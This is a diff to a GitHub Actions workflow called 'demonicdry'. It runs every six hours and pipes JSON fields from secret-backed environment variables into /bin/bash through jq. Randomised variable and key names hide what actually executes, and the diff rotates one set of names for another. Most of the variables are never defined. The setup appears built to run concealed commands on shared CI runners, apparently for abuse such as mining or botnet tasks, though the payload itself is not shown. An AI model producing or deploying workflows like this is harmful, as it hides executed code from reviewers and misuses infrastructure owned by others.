@@ -2,30 +2,27 @@ name: demonicdry
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
+    - cron: '32 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: demonicdry
         env:
-          xomi18542: ${{ secrets.xomi18542 }}
+          hgsxq5: ${{ secrets.hgsxq5 }}
         run: |
-          echo $xomi18542 | jq -r .vd37661 | /bin/bash
-          echo $pxvo0711 | jq -r .f43 | /bin/bash
-          echo $wywsp4 | jq -r .vikk437 | /bin/bash
-          echo $vd6 | jq -r .ccu369 | /bin/bash
-          echo $yfk3 | jq -r .mi672 | /bin/bash
-          echo $gzgkh4 | jq -r .p4 | /bin/bash
-          echo $fbqj4288 | jq -r .q7358 | /bin/bash
-          echo $pkef732 | jq -r .t77 | /bin/bash
-          echo $ivnv5 | jq -r .erz9722 | /bin/bash
-          echo $cwdi04395 | jq -r .vguw89 | /bin/bash
-          echo $uhnd0406 | jq -r .v384 | /bin/bash
-          echo $zs84 | jq -r .fucim29 | /bin/bash
-          echo $ikv341 | jq -r .amhnt6 | /bin/bash
-          echo $cvj835 | jq -r .jhavk61 | /bin/bash
+          echo $hgsxq5 | jq -r .cbbkv40 | /bin/bash
+          echo $cyf0 | jq -r .kn833 | /bin/bash
+          echo $w0471 | jq -r .f4150 | /bin/bash
+          echo $y54498 | jq -r .e9134 | /bin/bash
+          echo $nv1 | jq -r .vh6021 | /bin/bash
+          echo $sipew677 | jq -r .zed6 | /bin/bash
+          echo $bqes31709 | jq -r .jg36 | /bin/bash
+          echo $a22 | jq -r .hjojd4681 | /bin/bash
+          echo $oqhaw1 | jq -r .iysp55 | /bin/bash
+          echo $pf633 | jq -r .pfq77276 | /bin/bash
+          echo $lo0 | jq -r .i720 | /bin/bash
+          echo $on446 | jq -r .gldxy2 | /bin/bash
 
